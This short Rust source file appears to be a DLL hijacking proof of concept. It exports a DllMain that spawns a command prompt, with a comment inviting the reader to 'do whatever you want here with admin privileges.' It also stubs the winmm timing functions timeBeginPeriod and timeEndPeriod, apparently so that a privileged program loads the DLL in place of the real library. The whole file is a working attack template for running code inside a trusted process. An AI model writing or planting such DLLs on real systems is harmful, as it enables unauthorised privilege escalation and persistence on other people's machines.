static mut HAS_RUN: bool = false;

#[no_mangle]
pub extern "C" fn DllMain() {
  if unsafe { !HAS_RUN } {
    // do whatever you want here with admin privileges.
    // in this case, I just spawn a command prompt.
    std::process::Command::new("cmd")
      .spawn()
      .unwrap()
      .wait()
      .unwrap();

    unsafe { HAS_RUN = true };
  }
}

#[no_mangle]
pub extern "C" fn timeBeginPeriod() {
  // do nothing
}

#[no_mangle]
pub extern "C" fn timeEndPeriod() {
  // do nothing
}
